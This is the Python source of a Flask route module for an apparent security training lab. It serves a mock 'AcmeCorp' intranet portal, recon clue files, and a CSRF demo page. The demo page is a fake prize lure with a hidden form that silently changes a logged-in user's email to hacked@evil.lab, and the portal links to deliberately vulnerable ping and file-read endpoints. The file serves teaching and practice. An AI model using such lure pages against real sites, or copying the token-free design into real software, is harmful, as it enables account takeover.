"""
routes/home.py – Landing page + module-to-route aliases + CSRF lure page.
"""
import json
import logging
from flask import Blueprint, current_app, redirect, render_template_string, request

logger  = logging.getLogger("target.home")
home_bp = Blueprint("home", __name__)

_INDEX = """
<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"/>
<title>AcmeCorp Internal Portal</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#0f1117;color:#c8cdd8;min-height:100vh;}
a{color:#6ea8fe;text-decoration:none;transition:color .15s;}
a:hover{color:#9ec5fe;}
.topbar{background:linear-gradient(90deg,#1a1f2e,#252b3b);border-bottom:1px solid rgba(255,255,255,.08);padding:14px 32px;display:flex;align-items:center;justify-content:space-between;}
.topbar .brand{display:flex;align-items:center;gap:12px;}
.topbar .logo{width:36px;height:36px;border-radius:8px;background:linear-gradient(135deg,#3b82f6,#6366f1);display:flex;align-items:center;justify-content:center;font-weight:700;color:#fff;font-size:16px;}
.topbar h1{font-size:18px;font-weight:600;color:#e2e8f0;letter-spacing:.02em;}
.topbar .subtitle{font-size:11px;color:#64748b;letter-spacing:.08em;text-transform:uppercase;}
.container{max-width:960px;margin:0 auto;padding:40px 24px;}
.hero{background:linear-gradient(135deg,rgba(59,130,246,.08),rgba(99,102,241,.05));border:1px solid rgba(59,130,246,.15);border-radius:12px;padding:32px;margin-bottom:32px;}
.hero h2{font-size:22px;font-weight:600;color:#e2e8f0;margin-bottom:8px;}
.hero p{font-size:14px;color:#94a3b8;line-height:1.6;max-width:640px;}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px;margin-bottom:32px;}
.card{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.07);border-radius:10px;padding:20px;}
.card:hover{border-color:rgba(59,130,246,.3);}
.card .icon{width:40px;height:40px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:20px;margin-bottom:12px;}
.card h3{font-size:15px;font-weight:600;color:#e2e8f0;margin-bottom:4px;}
.card p{font-size:12px;color:#64748b;line-height:1.5;margin-bottom:12px;}
.card .link{font-size:12px;font-weight:600;display:inline-flex;align-items:center;gap:4px;}
.footer{text-align:center;padding:24px;border-top:1px solid rgba(255,255,255,.05);margin-top:40px;font-size:11px;color:#475569;}
</style>
<!-- Server: AcmeCorp-Internal/2.4.1 -->
<!-- Framework: Python/Flask -->
<!-- Build: 2024-Q3-internal -->
</head><body>
<div class="topbar">
  <div class="brand">
    <div class="logo">A</div>
    <div>
      <h1>AcmeCorp</h1>
      <div class="subtitle">Internal Staff Portal</div>
    </div>
  </div>
</div>

<div class="container">
  <div class="hero">
    <h2>&#128736; Staff Portal Dashboard</h2>
    <p>Access internal tools, manage your account, search our catalog, and submit support requests.</p>
  </div>

  <div class="grid">
    <div class="card">
      <div class="icon" style="background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2);">&#128274;</div>
      <h3>Staff Login</h3>
      <p>Authenticate to access protected resources and manage your profile settings.</p>
      <a href="{{ lab_url('/auth/login') }}" class="link" style="color:#f87171;">Sign In &rarr;</a>
    </div>
    <div class="card">
      <div class="icon" style="background:rgba(59,130,246,.1);border:1px solid rgba(59,130,246,.2);">&#128269;</div>
      <h3>Product Search</h3>
      <p>Search our internal product catalog and knowledge base for information.</p>
      <a href="{{ lab_url('/search?q=') }}" class="link" style="color:#60a5fa;">Search Catalog &rarr;</a>
    </div>
    <div class="card">
      <div class="icon" style="background:rgba(234,179,8,.1);border:1px solid rgba(234,179,8,.2);">&#128225;</div>
      <h3>Network Diagnostics</h3>
      <p>IT admin tools for checking network connectivity and server status.</p>
      <a href="{{ lab_url('/system/ping?host=127.0.0.1') }}" class="link" style="color:#facc15;">Run Diagnostics &rarr;</a>
    </div>
    <div class="card">
      <div class="icon" style="background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.2);">&#128196;</div>
      <h3>Document Viewer</h3>
      <p>Browse and read shared documents from the internal file repository.</p>
      <a href="{{ lab_url('/files/read?path=readme.txt') }}" class="link" style="color:#4ade80;">View Documents &rarr;</a>
    </div>
    <div class="card">
      <div class="icon" style="background:rgba(168,85,247,.1);border:1px solid rgba(168,85,247,.2);">&#128229;</div>
      <h3>File Upload</h3>
      <p>Submit support ticket attachments and upload documents for review.</p>
      <a href="{{ lab_url('/files/upload') }}" class="link" style="color:#a78bfa;">Upload Files &rarr;</a>
    </div>
    <div class="card">
      <div class="icon" style="background:rgba(6,182,212,.1);border:1px solid rgba(6,182,212,.2);">&#128100;</div>
      <h3>My Profile</h3>
      <p>View and update your account information and notification preferences.</p>
      <a href="{{ lab_url('/profile/') }}" class="link" style="color:#22d3ee;">Manage Profile &rarr;</a>
    </div>
  </div>

  <div class="footer">
    <p>AcmeCorp Internal Portal v2.4.1 &middot; IT Department</p>
    <p style="margin-top:4px;">Server: acme-web-01 &middot; Flask/Werkzeug</p>
  </div>
</div>
</body></html>
"""


@home_bp.route("/")
def index():
    # Recon learners: log every visit
    logger.info(json.dumps({
        "event": "portal_visited",
        "endpoint": "/",
        "source_ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent", ""),
    }))
    import evidence
    evidence.record(
        "portal_visited",
        module_id="recon",
        path="/", method="GET",
        source_ip=request.remote_addr,
    )
    return render_template_string(_INDEX)


# ── Friendly aliases (preserve canonical paths via 307 redirect) ────────────
@home_bp.route("/tools/ping")
def alias_ping():
    qs = request.query_string.decode("utf-8", errors="replace")
    target = current_app.lab_url("/system/ping")
    if qs:
        target += f"?{qs}"
    return redirect(target, code=307)


@home_bp.route("/upload", methods=["GET", "POST"])
def alias_upload():
    return redirect(current_app.lab_url("/files/upload"), code=307)


@home_bp.route("/files/view")
def alias_files_view():
    qs = request.query_string.decode("utf-8", errors="replace")
    target = current_app.lab_url("/files/read")
    if qs:
        target += f"?{qs}"
    return redirect(target, code=307)


# ── Hidden clue routes (recon module — "Discover a hidden lab clue") ─────────
# Common recon targets: /robots.txt and /.well-known/security.txt. A learner
# who checks these earns the hidden_clue_accessed event for the recon module.
@home_bp.route("/robots.txt")
def robots_txt():
    import evidence
    evidence.record(
        "hidden_clue_accessed",
        module_id="recon",
        path="/robots.txt", method="GET",
        source_ip=request.remote_addr,
        severity="low",
        learner_message="Discovered robots.txt — contains disallowed admin paths.",
    )
    logger.info(json.dumps({
        "event": "hidden_clue_accessed",
        "endpoint": "/robots.txt",
        "source_ip": request.remote_addr,
    }))
    from flask import Response
    return Response(
        "# AcmeCorp Internal — do not index\n"
        "User-agent: *\n"
        "Disallow: /admin/\n"
        "Disallow: /system/\n"
        "Disallow: /files/\n"
        "Disallow: /backup/\n"
        "# Internal build: 2024-Q3 | Framework: Flask/Werkzeug\n",
        mimetype="text/plain",
    )


@home_bp.route("/.well-known/security.txt")
def security_txt():
    import evidence
    evidence.record(
        "hidden_clue_accessed",
        module_id="recon",
        path="/.well-known/security.txt", method="GET",
        source_ip=request.remote_addr,
        severity="low",
        learner_message="Discovered security.txt — reveals internal contact info and policy.",
    )
    logger.info(json.dumps({
        "event": "hidden_clue_accessed",
        "endpoint": "/.well-known/security.txt",
        "source_ip": request.remote_addr,
    }))
    from flask import Response
    return Response(
        "Contact: security@acmecorp.local\n"
        "Expires: 2026-12-31T23:59:59.000Z\n"
        "Preferred-Languages: en\n"
        "Canonical: http://acmecorp.local/.well-known/security.txt\n"
        "Policy: http://acmecorp.local/security-policy\n"
        "# Internal security team: soc-team@acmecorp.local\n",
        mimetype="text/plain",
    )


# ── CSRF lure page (local-only, in-lab attacker) ────────────────────────────
# Demonstrates the CSRF vulnerability against /profile/update. Educational
# only: this page is served by the SAME target-agent host and never reaches
# the public internet.
_LURE_PAGE = """
<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"/>
<title>You won a free reward!</title>
<style>
body{font-family:'Segoe UI',system-ui,sans-serif;background:#1a0a1f;color:#f5d4ff;
     min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;}
.card{background:rgba(40,10,55,0.85);border:1px solid rgba(168,85,247,.4);border-radius:16px;
      padding:36px;max-width:520px;text-align:center;}
.lab-banner{background:rgba(245,196,0,.1);border:1px solid rgba(245,196,0,.4);color:#facc15;
            font-size:11px;padding:8px 12px;border-radius:8px;margin-bottom:18px;
            letter-spacing:.08em;text-transform:uppercase;}
h1{font-size:26px;margin-bottom:10px;color:#f0abfc;}
p{font-size:14px;color:#cbb4d4;line-height:1.6;margin-bottom:18px;}
.btn{padding:13px 30px;background:linear-gradient(135deg,#a855f7,#7c3aed);color:#fff;
     border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;letter-spacing:.04em;}
.btn:hover{filter:brightness(1.1);}
.explainer{margin-top:22px;padding-top:18px;border-top:1px solid rgba(255,255,255,.08);
           font-size:11px;color:#7a5688;line-height:1.6;}
.explainer code{background:rgba(0,0,0,.4);padding:1px 5px;border-radius:3px;color:#f0abfc;}
</style>
</head><body>
<div class="card">
  <div class="lab-banner">&#9888; Lab simulation · attacker-controlled page</div>
  <h1>&#127881; You won a free reward!</h1>
  <p>Click the button below to claim your gift card.<br>
     One per account. Don't miss out!</p>

  <!--
    Hidden CSRF: this form auto-targets /profile/update on the same target-agent
    host. If the learner is logged in (has a session cookie), submitting this
    will silently change their email — no token, no Referer check.
  -->
  <form id="lure" method="POST" action="{{ lab_url('/profile/update') }}">
    <input type="hidden" name="email" value="hacked@evil.lab">
    <button type="submit" class="btn">Claim my reward &rarr;</button>
  </form>

  <div class="explainer">
    <strong>What this proves:</strong><br>
    A simple button click can submit a form that changes your account email
    on AcmeCorp — because <code>/profile/update</code> has no CSRF token
    and accepts any same-origin POST. Open <code>{{ lab_url('/profile/') }}</code>
    after clicking to confirm the change.
  </div>
</div>
</body></html>
"""


@home_bp.route("/evil/csrf-demo")
def csrf_lure():
    """Local-only attacker-controlled page used by the CSRF lab module."""
    logger.info(json.dumps({
        "event": "csrf_lure_visited",
        "endpoint": "/evil/csrf-demo",
        "source_ip": request.remote_addr,
        "module_id": "csrf",
    }))
    import evidence
    evidence.record(
        "csrf_lure_visited",
        module_id="csrf",
        path="/evil/csrf-demo", method="GET",
        source_ip=request.remote_addr,
        severity="medium",
    )
    return render_template_string(_LURE_PAGE)
